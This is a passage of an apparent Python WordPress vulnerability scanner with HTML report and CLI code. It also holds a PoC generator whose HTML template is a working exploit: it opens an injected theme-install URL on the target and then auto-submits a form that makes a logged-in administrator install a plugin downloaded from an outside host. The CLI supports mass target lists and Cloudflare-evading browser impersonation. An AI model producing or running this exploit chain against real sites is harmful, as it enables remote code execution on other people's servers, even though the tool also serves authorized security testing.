            for raw, reason in skipped
        )
        skipped_rows = (
            f"<h2 style='margin:2rem 0 .6rem;font-size:1.05rem'>"
            f"Filtered / duplicates ({len(skipped)})</h2>"
            f"<div class='card'><ul style='list-style:none;font-size:.85rem'>{items}</ul></div>"
        )

    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    c2s_base = ".".join(map(str, C2S_FIXED_VERSION))
    pt_base  = ".".join(map(str, PT_FIXED_VERSION))

    html = f"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WordPress-Vulns Report</title>
<style>{HTML_REPORT_CSS}</style>
</head>
<body>
<div class="wrap">
  <header>
    <p class="author">CronUp Cybersecurity</p>
    <h1>WordPress-Vulns Report</h1>
    <p class="meta">
      Generated {esc(now)}
      &middot; Click2Shell baseline <code>WordPress &lt; {esc(c2s_base)}</code>
      &middot; CVE-2026-87902 baseline <code>WordPress &lt; {esc(pt_base)}</code>
    </p>
  </header>

  <section class="summary">
    <div class="card blue"><div class="num">{len(results)}</div><div class="lbl">Targets</div></div>
    <div class="card blue"><div class="num">{n_wp}</div><div class="lbl">WordPress</div></div>
    <div class="card red"><div class="num">{n_c2s}</div><div class="lbl">Click2Shell</div></div>
    <div class="card purple"><div class="num">{n_pt}</div><div class="lbl">CVE-2026-87902</div></div>
    <div class="card darkred"><div class="num">{n_both}</div><div class="lbl">Both CVEs</div></div>
    <div class="card amber"><div class="num">{n_mrz}</div><div class="lbl">MRZ chain theme</div></div>
    <div class="card slate"><div class="num">{n_blk + n_off}</div><div class="lbl">Blocked / Offline</div></div>
  </section>

  <table id="results">
    <thead><tr>
      <th data-label="Target" onclick="sortTable(0)">Target</th>
      <th data-label="WP" onclick="sortTable(1)">WP</th>
      <th data-label="Version" onclick="sortTable(2)">Version</th>
      <th data-label="Click2Shell" onclick="sortTable(3)">Click2Shell</th>
      <th data-label="CVE-2026-87902" onclick="sortTable(4)">CVE-2026-87902</th>
      <th data-label="MRZ" onclick="sortTable(5)">MRZ</th>
      <th data-label="Setup" onclick="sortTable(6)">Setup</th>
      <th data-label="Source" onclick="sortTable(7)">Source</th>
    </tr></thead>
    <tbody>{"".join(rows)}</tbody>
  </table>
  {skipped_rows}

  <footer>
    WordPress-Vulns &middot; CronUp Cybersecurity &middot;
    Authorized use only &middot; Passive WordPress vulnerability detection.
  </footer>
</div>
<script>{SORT_TABLE_JS}</script>
</body>
</html>"""

    with open(out_path, "w", encoding="utf-8") as f:
        f.write(html)
    return out_path


# --------------------------------------------------------------------------- #
# Click2Shell PoC generator (CVE 1 â€” requires authenticated admin visit)
# --------------------------------------------------------------------------- #
POC_HTML_TEMPLATE = """<!doctype html>
<!-- WordPress-Vulns PoC â€” AUTHORIZED TESTING ONLY -->
<!-- Stage-2 RCE chain. Requires an AUTHENTICATED WordPress Administrator. -->
<html lang="en">
<meta charset="utf-8">
<title>Click2Shell PoC (stage-2 RCE chain)</title>
<body style="font-family:monospace;padding:2rem">
  <h2>Click2Shell â€” stage 2 (auto-submit)</h2>
  <p>Target: <code>{target}</code></p>
  <p>Theme: <code>{theme_slug}</code></p>
  <button id="launch">Launch chain</button>
  <p id="status" style="color:#b00"></p>

  <form id="stage-two" method="post" target="victim" hidden>
    <input name="action" value="{ajax_action}">
    <input name="plugin_details[plugin_text_domain]" value="mrz-chain-marker">
    <input name="plugin_details[plugin_main_file]" value="mrz-chain-marker.php">
    <input id="plugin-url" name="plugin_details[plugin_url]" value="">
  </form>

<script>
const TARGET_ORIGIN = '{target}';
const STAGE_TWO_DELAY_MS = {delay_ms};
const THEME_SLUG = '{theme_slug}';

const target = TARGET_ORIGIN.replace(/\\/$/, '');
const installUrl = new URL(target + '/wp-admin/theme-install.php');
installUrl.searchParams.set('theme', THEME_SLUG + '\\"]>*>*>*/*');
const stageTwoUrl = new URL(target + '/wp-admin/admin-ajax.php');
stageTwoUrl.searchParams.set('wp_customize', 'on');
stageTwoUrl.searchParams.set('customize_theme', THEME_SLUG);

const pluginUrl = 'https://httpbingo.org/base64/' +
  encodeURIComponent('{zip_b64}');
const form = document.querySelector('#stage-two');
form.action = stageTwoUrl.href;
document.querySelector('#plugin-url').value = pluginUrl;

document.querySelector('#launch').addEventListener('click', () => {{
  const popup = window.open(installUrl.href, 'victim');
  if (!popup) {{
    document.querySelector('#status').textContent =
      'Browser blocked the popup. Allow popups for this file and retry.';
    return;
  }}
  const deadline = Date.now() + STAGE_TWO_DELAY_MS;
  const timer = setInterval(() => {{
    const s = Math.max(0, Math.ceil((deadline - Date.now()) / 1000));
    document.querySelector('#status').textContent =
      'Complete the WordPress login. Stage two fires automatically in ' + s + 's.';
    if (s === 0) clearInterval(timer);
  }}, 250);
  setTimeout(() => {{
    document.querySelector('#status').textContent = 'Stage two submitted.';
    form.submit();
  }}, STAGE_TWO_DELAY_MS);
}}, {{once: true}});
</script>
</body></html>
"""

VISUAL_PLUGIN_ZIP_B64 = (
    "UEsDBAoAAAAAANJsIV0AAAAAAAAAAAAAAAARABwAbXJ6LWNoYWluLW1hcmtlci9VVAkAA5wNl2qhDZdq"
    "dXgLAAEE9gEAAAQUAAAAUEsDBBQAAAAIAPFsIV0eg5hvbAQAAE4IAAAlABwAbXJ6LWNoYWluLW1hcmtl"
    "ci9tcnotY2hhaW4tbWFya2VyLnBocFVUCQAD1Q2XatUNl2p1eAsAAQT2AQAABBQAAACNVX9v2kgQ/Rt/"
    "iilpa6gwGBoUzgaqNCFKpCbhCG2lXk/WYg94r7Z3tbsQ0qrf/WZt0vxoLjoFKfLu7Js382bfDt/JVDqd"
    "N28ceAPTbL3iBVywHAM4n32BqUKPxYZvmOGigE9cr1lGq0Isbfwx6lhxafcCOGUqz1BryETMMk8U2Q1s"
    "qgPSHgD6MWNY/A2VpzHD2GAC09Mp4BbjtQVpW9BPqHQJ2G37bZ9WOo7Dl9CAF5DgkheYNMA9fH81PZyf"
    "utCkvx9ODbfchM5Px3mZq+9RlTbKmaJcMILP0+jo8mI+uZhHx2czaIPbWctMsER3KNyTCu+K9OKU8cKr"
    "zrbN1rihs+QZRnJtolgUBgujG/B7nha41LJoOpscHs3PPh3Ozy4votnRhFYuL0+IaVjV4dSuZZQIXqwi"
    "9g/bNppO7fVr4FqjIdhoNvnz4+Rq/pdrKYnC/RuqADcXC0tDoWRcRd9FgREvtGFZFrEiiXYVEM9SRBdG"
    "o9FTcE7Zr1UmFiTMy2uZLEKn9lIboXAHgpFJMUfqW7ntjVdoog1TxLy2W5GWhUK7UqtfTT5MjuYgyjm"
    "gwGyNcDK7PIcfu+hqR/+Ez6eT2eQ2sGBljle63rIwrjY3ND4ponHpm4q2DaulxkiqWUsCQOp/gg3o+b7t"
    "Zi1FlqCiaTiqZPHmN5IG1+DWdFKTZyGQlor6Ovo4P/EG7qNDLE7Rs0eVyAIohFc2oRKqhnEqwB2+SERs"
    "CBUs3niYo2G/QOtrs/QG9fHQcJPh+NFdIeWruR92qn2ao1vUhUhuoKx3VKfhIbkCP1zQzVgpsS6SYM8f"
    "dPf9JIxFJlSwh2y5xGW4JKpBb19uO912HzwmZYaevtEG89b7jBffzll8VX6eUGTrClcC4eNZS7NC04VT"
    "fFm/TyKnMb8lsRBbT/PvNJPBQijqj0crYU73IEW+Sk3Q9f1NGkqWJDZmsElhsLm+T1mxhNOtX9n/JEUj"
    "5irOkC48GCFBWZDWXvdgn/UWrV150B+8aj6glPDNXVu23jVPTEqp+77chhWvoCe3oEXGE9jrH+DbwR+7"
    "Dc8mXuuyP7947g/Kg1RbyhJxHfjgw4DAQK0WrDE4aPV6B63u24NWu9f/TyY7EXbZrAi2VRh0LXiGxlg7"
    "kyy2CdvdAeahHUDPKGr7Uqg8WEuJKmYa6+MP1hqBrU0qFGEktxNC6e5nT7u3ye/S9W1hpDL+kqTtD8Ld"
    "9Fgu4Ncfz+ADcwUyryVXOSbDTtq9n06OP1MP6SyZdxVOzMgDnrDrylxK4OuU7AiGmq5PsRqfl+4Es9Kd"
    "4Au5Eyi0I0aHeFH5yrCzC24PO/IhgavSf6CKg9J/Ahja6/6kDKQVuTi9PpG9l2SbT/lX0xr9sGNBxr8n"
    "RLWht6Gy7udTPePqT6OXcg47tvr7y9VbOSbrmPMcxdo0Gk0YjYFlqEyjTim8uxylf9CjdXI2O58cf/1a"
    "0O/wmdeTPipB/o8Q7QrvfFf8MwXWmy046PvNkLSr6N+v0/pYtbB7fv8FUEsBAh4DCgAAAAAA0mwhXQAA"
    "AAAAAAAAAAAAABEAGAAAAAAAAAAQAO1BAAAAAG1yei1jaGFpbi1tYXJrZXIvVVQFAAOcDZdqdXgLAAEE9g"
    "EAAAQUAAAAUEsBAh4DFAAAAAgA8WwhXR6DmG9sBAAATggAACUAGAAAAAAAAQAAAKSBSwAAAG1yei1jaGFp"
    "bi1tYXJrZXIvbXJ6LWNoYWluLW1hcmtlci5waHBVVAUAA9UNl2p1eAsAAQT2AQAABBQAAABQSwUGAAAA"
    "AAIAA"
    "gDCAAAAFgUAAAAA"
)


def generate_poc(
    target: str,
    out_path: str,
    delay_ms: int = 60000,
    theme_slug: str = CHAIN_THEME,
    ajax_action: str = "mobile_repair_zone_install_and_activate_plugin",
) -> str:
    base = normalize_url(target)
    html = POC_HTML_TEMPLATE.format(
        target=base,
        theme_slug=theme_slug,
        ajax_action=ajax_action,
        delay_ms=delay_ms,
        zip_b64=VISUAL_PLUGIN_ZIP_B64,
    )
    with open(out_path, "w", encoding="utf-8") as f:
        f.write(html)
    return out_path


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #
def main():
    global POLITE_DELAY, USE_COLOR

    ap = argparse.ArgumentParser(
        description=(
            "WordPress-Vulns â€” passive scanner for two critical WordPress CVEs:\n"
            "  â€¢ Click2Shell  (Theme Preview Injection â†’ RCE, WP < 7.1.1)\n"
            "  â€¢ CVE-2026-87902  (Path Traversal â†’ LFI, WP < 7.1.2, CVSS 9.2)"
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python wp_checker.py -t https://example.com\n"
            "  python wp_checker.py -l targets.txt --html report.html\n"
            "  python wp_checker.py -l targets.txt --json out.json --csv out.csv\n"
            "  python wp_checker.py --poc example.com --poc-out poc.html\n"
        ),
    )

    src = ap.add_mutually_exclusive_group()
    src.add_argument("-t", "--target", help="Single target URL or domain")
    src.add_argument("-l", "--list",   help="File with one target per line")

    ap.add_argument("--threads",   type=int,   default=15,              help="Concurrent workers (default 15)")
    ap.add_argument("--timeout",   type=int,   default=REQUEST_TIMEOUT, help="HTTP timeout in seconds")
    ap.add_argument("--delay",     type=float, default=POLITE_DELAY,    help="Per-request courtesy delay (seconds)")
    ap.add_argument("--insecure",  action="store_true",                 help="Ignore TLS certificate errors")
    ap.add_argument("--no-impersonate", action="store_true",            help="Disable Chrome browser impersonation")
    ap.add_argument("--no-chain",  action="store_true",                 help="Skip mobile-repair-zone theme check")
    ap.add_argument("--no-pathtrav", action="store_true",               help="Skip CVE-2026-87902 behavioral check")
    ap.add_argument("--prefer-https", action="store_true",              help="Prefer HTTPS when same host has both schemes")
    ap.add_argument("--no-color",  action="store_true",                 help="Disable ANSI colors")

    ap.add_argument("--json",  metavar="FILE", help="Write results as JSON")
    ap.add_argument("--csv",   metavar="FILE", help="Write results as CSV")
    ap.add_argument("--html",  metavar="FILE", help="Write HTML report")

    ap.add_argument("--poc",       metavar="TARGET",                    help="Generate Click2Shell PoC HTML for a target")
    ap.add_argument("--poc-out",   default="click2shell_poc.html",      help="PoC output path (default click2shell_poc.html)")
    ap.add_argument("--poc-delay", type=int, default=60000,             help="Stage-2 delay in ms (default 60000)")
    ap.add_argument("--poc-theme", default=CHAIN_THEME,                 help="Theme slug for PoC")

    args = ap.parse_args()

    if not (args.target or args.list or args.poc):
        ap.error("one of -t/--target, -l/--list, or --poc is required")

    POLITE_DELAY = args.delay
    verify = not args.insecure

    if _COLORAMA:
        just_fix_windows_console()
    USE_COLOR = (not args.no_color) and sys.stdout.isatty()

    # Chrome impersonation (reduces Cloudflare bot challenges)
    use_impersonate = False
    if not args.no_impersonate:
        try:
            import curl_cffi  # noqa: F401
            use_impersonate = True
        except ImportError:
            print(dim(
                "[!] curl_cffi not installed â€” using plain requests. "
                "Install with: pip install curl_cffi for better Cloudflare bypass."
            ))

    # PoC-only mode
    if args.poc:
        out = generate_poc(args.poc, args.poc_out, args.poc_delay, args.poc_theme)
        print(f"[+] Click2Shell PoC written to {out}")
        print("[!] Requires an AUTHENTICATED ADMINISTRATOR to open the page.")
        print("[!] Use only on systems you own or are authorized to test.")
        return

    # Load targets
    if args.target:
        raw_entries = [args.target]
    else:
        with open(args.list, "r", encoding="utf-8") as f:
            raw_entries = f.read().splitlines()

    targets, tstats = load_targets(raw_entries, args.prefer_https)
    if not targets:
        sys.exit(red("[!] No valid targets supplied."))

    check_pt    = not args.no_pathtrav
    check_chain = not args.no_chain

    c2s_base = ".".join(map(str, C2S_FIXED_VERSION))
    pt_base  = ".".join(map(str, PT_FIXED_VERSION))
    print(bold(f"[*] Scanning {len(targets)} target(s)") + dim(" â€” passive checks only."))
    print(bold("[*] Click2Shell baseline: ") + yellow(f"WP < {c2s_base}"))
    print(bold("[*] CVE-2026-87902 baseline: ") + yellow(f"WP < {pt_base}") + dim(" (CVSS 9.2, behavioral check)"))

    if args.list:
        print(dim(
            f"[*] Input: {tstats['total']} lines â†’ {tstats['valid']} valid, "
            f"{tstats['invalid']} invalid, {tstats['duplicates']} duplicate(s)."
        ))
        for raw, reason in tstats["skipped"]:
            if reason == "invalid host/URL":
                print(yellow(f"    [!] skipped: {raw!r} ({reason})"))

    results = []
    total = len(targets)
    show_progress = sys.stdout.isatty() and not args.no_color
    if show_progress and total > 1:
        print()
    done = 0

    with ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {
            ex.submit(
                scan_target, t, verify, args.timeout, check_chain, check_pt, use_impersonate
            ): t
            for t in targets
        }
        for fut in as_completed(futs):
            try:
                results.append(fut.result())
            except Exception as e:
                results.append(Detection(target=futs[fut], error=str(e)))
            done += 1
            if show_progress and total > 1:
                print(f"\r{render_progress(done, total)}", end="", flush=True)

    if show_progress and total > 1:
        print()

    order = {t: i for i, t in enumerate(targets)}
    results.sort(key=lambda d: order.get(d.target, 9999))

    print_table(results)

    # Summary counts
    vuln_c2s = [d for d in results if d.vulnerable_click2shell]
    vuln_pt  = [d for d in results if d.pathtrav_vuln]
    both     = [d for d in results if d.any_critical]
    mrz      = [d for d in results if d.chain_theme_installed]
    wp       = [d for d in results if d.is_wordpress]
    setup    = [d for d in results if d.setup_exposed]
    blocked  = [d for d in results if d.blocked]
    offline  = [d for d in results if d.offline]

    print(
        "\n"
        + bold(f"[+] WordPress: {green(str(len(wp)))}")
        + " | " + bold(f"Click2Shell: {red(str(len(vuln_c2s)))}")
        + " | " + bold(f"CVE-2026-87902: {magenta(str(len(vuln_pt)))}")
        + " | " + bold(f"Either CVE: {red(str(len(both)))}")
        + " | " + bold(f"MRZ: {yellow(str(len(mrz)))}")
        + " | " + bold(f"Setup: {yellow(str(len(setup)))}")
        + " | " + bold(f"Blocked/Offline: {dim(str(len(blocked)+len(offline)))}")
    )

    if vuln_c2s:
        print(dim(
            "[!] Click2Shell = forced theme-install primitive (High) chaining to RCE. "
            "'MRZ' = chain theme on disk (ready locally; absence does NOT mean safe)."
        ))
    if vuln_pt:
        print(dim(
            "[!] CVE-2026-87902 = double-encoded path traversal â†’ LFI (CVSS 9.2, no auth)."
        ))
    if blocked or offline:
        print(dim(
            "[!] BLOCKED = WAF/bot challenge. OFFLINE = unreachable. "
            "Re-test manually or with --insecure."
        ))

    # Exports
    if args.json:
        with open(args.json, "w", encoding="utf-8") as f:
            json.dump({
                "generated": datetime.now(timezone.utc).isoformat(),
                "baselines": {
                    "click2shell": f"WordPress {c2s_base}",
                    "cve_2026_87902": f"WordPress {pt_base}",
                },
                "results": [d.to_dict() for d in results],
            }, f, indent=2)
        print(green(f"[+] JSON â†’ {args.json}"))

    if args.csv:
        fieldnames = [
            "target", "is_wordpress", "version", "version_source",
            "vulnerable_click2shell", "chain_theme_installed", "chain_theme_version",
            "vulnerable_pathtrav", "pathtrav_checked", "pathtrav_page_id",
            "setup_exposed", "blocked", "offline", "http_status", "error",
        ]
        with open(args.csv, "w", newline="", encoding="utf-8") as f:
            w = csv.DictWriter(f, fieldnames=fieldnames)
            w.writeheader()
            for d in results:
                w.writerow({k: d.to_dict()[k] for k in fieldnames})
        print(green(f"[+] CSV â†’ {args.csv}"))

    if args.html:
        out = generate_html_report(
            results, args.html,
            stats=tstats,
            skipped=tstats["skipped"] if args.list else None,
        )
        print(green(f"[+] HTML report â†’ {out}"))


if __name__ == "__main__":
    main()

